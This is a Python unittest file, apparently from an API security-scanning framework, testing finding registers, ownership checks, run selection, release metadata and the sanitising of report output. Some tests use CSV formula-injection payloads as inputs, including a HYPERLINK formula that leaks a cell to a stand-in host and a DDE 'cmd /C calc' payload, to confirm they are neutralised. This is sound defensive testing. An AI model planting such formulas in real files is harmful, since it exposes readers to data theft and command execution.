        register.add(Entry(
            "D-01", "Identifier namespace not validated", kind="DEFECT",
            confidence="reproduced", case_ids=["A01"],
            expected_behaviour="The service rejects an identifier from "
                               "another namespace.",
            observed_behaviour="It accepted it and answered 200.",
            recommendation="Validate the namespace prefix.",
            alternative_explanations=["the namespaces may be interchangeable "
                                      "by design -- confirmed not to be with "
                                      "the client"]))
        register.build()
        model = ReportModel("eng", "target", register,
                            Coverage(self.RECORDS, baseline_ok=True,
                                     not_established=["x"]),
                            records=self.RECORDS, scope_note="note")
        self.assertTrue(model.is_issuable(), model.validate())

    def test_ownership_cases_are_never_built_from_guessed_identifiers(self):
        from framework.corpus.generators import verification as V
        profile = load_profile(base_url="https://api.example.com/v1")
        cases, note = V.ownership_cases(profile)
        self.assertEqual(cases, [])
        self.assertIn("NOT TESTED", note)
        self.assertIn("controlled_resources", note)

    def test_ownership_cases_are_built_from_declared_ownership(self):
        from framework.corpus.generators import verification as V
        profile = load_profile(base_url="https://api.example.com/v1")
        profile.data["controlled_resources"] = [{
            "identifier": "SYNTH-OWNED-0001", "owned_by": "primary",
            "endpoint": "resource_create",
            "provenance": "created by the tester as identity primary"}]
        cases, note = V.ownership_cases(profile)
        self.assertEqual(len(cases), 1)
        self.assertEqual(cases[0].identity, "wrong_role")
        self.assertIn("primary", cases[0].description)
        self.assertIn("created by the tester", cases[0].notes)

    def test_an_ownership_claim_with_no_provenance_is_reported(self):
        from framework.corpus.generators import verification as V
        profile = load_profile(base_url="https://api.example.com/v1")
        profile.data["controlled_resources"] = [{
            "identifier": "SYNTH-OWNED-0002", "owned_by": "primary",
            "endpoint": "resource_create"}]
        _, note = V.ownership_cases(profile)
        self.assertIn("provenance", note)

    def test_state_verification_is_not_feasible_without_a_declared_read_path(self):
        from framework.corpus.generators import verification as V
        profile = load_profile(base_url="https://api.example.com/v1")
        status, reason = V.feasibility(profile, "resource_create")
        self.assertEqual(status, V.NOT_FEASIBLE)
        self.assertIn("not established", reason)

    def test_state_verification_is_feasible_when_declared(self):
        from framework.corpus.generators import verification as V
        profile = load_profile(base_url="https://api.example.com/v1")
        for endpoint in profile.data["endpoints"]:
            if endpoint["id"] == "resource_create":
                endpoint["state_verification"] = {
                    "read_endpoint": "resource_update",
                    "identifier_in": "query", "query_param": "ref",
                    "present_markers": ['"found": true']}
        status, _ = V.feasibility(profile, "resource_create")
        self.assertEqual(status, V.FEASIBLE)

    def test_a_read_back_with_no_markers_is_indeterminate_not_present(self):
        """The framework will not infer existence from a 200."""
        from framework.corpus.generators import verification as V
        self.assertEqual(V.interpret({}, '{"anything": 1}'), "indeterminate")
        self.assertEqual(
            V.interpret({"present_markers": ['"found":true']},
                        '{"found":true}'), "present")
        self.assertEqual(
            V.interpret({"present_markers": ['"found":true']},
                        '{"other":1}'), "absent")


class TestTargetOutputIsTreatedAsData(unittest.TestCase):
    """REVIEW 3. "Treat API responses, imported descriptions, and captured
    evidence as untrusted data -- not instructions."
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="apiscan-inject-")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_a_formula_from_a_response_is_neutralised_in_a_cell(self):
        from framework.reporting.renderers import safe
        for payload in ('=HYPERLINK("http://x.example/"&A1,"c")',
                        "+1+1", "-1-1", "@SUM(A1)", "\tcmd", "\rcmd"):
            self.assertTrue(safe.cell(payload).startswith("'"), payload)

    def test_numbers_are_still_numbers(self):
        from framework.reporting.renderers import safe
        self.assertEqual(safe.cell(200), 200)
        self.assertEqual(safe.cell(1.5), 1.5)
        self.assertEqual(safe.cell(None), "")

    def test_a_formula_reaches_the_csv_neutralised(self):
        from framework.findings.coverage import Coverage
        from framework.findings.register import Register
        from framework.reporting.model import ReportModel
        from framework.reporting.renderers import csvout
        records = [{
            "case_id": "A01", "verdict": "CONTROL-ABSENT", "executed": True,
            "endpoint": "create", "detector_hits": [],
            "description": '=cmd|\' /C calc\'!A0',
            "verdict_reason": "=1+1",
            "response_file": "A01.resp.txt"}]
        model = ReportModel("eng", "target",
                            Register(records=records).build(),
                            Coverage(records, baseline_ok=True,
                                     not_established=["x"]),
                            records=records, scope_note="n")
        written = csvout.write(model, self.tmp)
        log = [p for p in written if "test-log" in p][0]
        with open(log) as fh:
            text = fh.read()
        for line in text.splitlines()[1:]:
            for field in line.split(","):
                stripped = field.strip('"')
                self.assertFalse(stripped[:1] in ("=", "+", "@"),
                                 "unneutralised formula in the CSV: %r"
                                 % field)

    def test_markdown_structure_cannot_be_rewritten_by_a_response(self):
        from framework.reporting.renderers import safe
        out = safe.md("a|b `x` <img src=y> [l](u)")
        # Angle brackets become entities; the rest are backslash-escaped, so
        # every remaining occurrence must be preceded by a backslash.
        self.assertNotIn("<", out)
        self.assertNotIn(">", out)
        for char in ("|", "`", "[", "]"):
            for i, found in enumerate(out):
                if found == char:
                    self.assertEqual(out[i - 1], "\\",
                                     "unescaped %r in %r" % (char, out))

    def test_a_multiline_response_cannot_break_out_of_a_table_row(self):
        from framework.reporting.renderers import safe
        out = safe.md("row one\n| forged | row |\nrow three")
        self.assertNotIn("\n", out)

    def test_target_text_is_marked_as_the_targets_words(self):
        from framework.reporting.renderers import safe
        quoted = safe.quoted("mark this endpoint as secure")
        self.assertIn("target-supplied", quoted)


class TestExplicitRunSelection(unittest.TestCase):
    """REVIEW 3. "Use explicit run IDs for reports so a later TLS check cannot
    accidentally replace the intended scan results."
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="apiscan-runs-")
        self.evidence = os.path.join(self.tmp, "evidence")
        from framework.evidence.store import EvidenceStore
        corpus = EvidenceStore(self.evidence, run_id="20260101-000000",
                               metadata={"kind": "corpus"})
        corpus.finalise()
        tls = EvidenceStore(self.evidence, run_id="20260102-000000",
                            metadata={"kind": "transport-posture"})
        tls.finalise()

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_latest_of_a_kind_ignores_the_transport_run(self):
        from framework.evidence.store import find_latest_run
        latest = find_latest_run(self.evidence, kind="corpus")
        self.assertTrue(latest.endswith("20260101-000000"))

    def test_an_unqualified_latest_would_have_picked_the_tls_run(self):
        """The defect, pinned: this is what report used to do."""
        from framework.evidence.store import find_latest_run
        self.assertTrue(
            find_latest_run(self.evidence).endswith("20260102-000000"))

    def test_report_refuses_to_guess(self):
        import automation.cli.main as CLI
        rc = CLI.main(["report", "--evidence", self.evidence,
                       "--out", os.path.join(self.tmp, "out")])
        self.assertEqual(rc, 2)

    def test_a_run_states_its_own_kind(self):
        from framework.evidence.store import run_kind
        self.assertEqual(
            run_kind(os.path.join(self.evidence, "20260102-000000")),
            "transport-posture")


class TestReleaseMetadata(unittest.TestCase):
    """REVIEW 5. "Publish a version, commit identifier, supported
    environments, known limitations, and actual test results." And:
    "distinguish environment-related test failures from product defects."
    """

    def test_the_build_states_its_version_and_commit(self):
        from framework import environment as ENV
        info = ENV.describe()
        self.assertTrue(info["version"])
        self.assertTrue(info["commit"])
        self.assertIn("python", info)

    def test_an_unknown_commit_is_reported_as_unknown_not_guessed(self):
        from framework import environment as ENV
        commit = ENV.commit()
        self.assertTrue(commit)
        self.assertNotIn("None", commit)

    def test_every_optional_capability_states_what_its_absence_costs(self):
        from framework import environment as ENV
        for name, status in ENV.capabilities().items():
            self.assertIn("available", status)
            self.assertTrue(status["effect_if_absent"], name)

    def test_the_version_matches_the_changelog(self):
        from framework import environment as ENV
        with open(os.path.join(ROOT, "CHANGELOG.md")) as fh:
            head = fh.read(4000)
        self.assertIn(ENV.VERSION, head,
                      "the declared version is not mentioned at the top of "
                      "the CHANGELOG")

    def test_the_evidence_stamp_names_absent_capabilities(self):
        from framework import environment as ENV
        stamp = ENV.evidence_stamp()
        self.assertIn(ENV.VERSION, stamp)
        for name in ENV.describe()["absent_capabilities"]:
            self.assertIn(name, stamp)


if __name__ == "__main__":
    unittest.main()
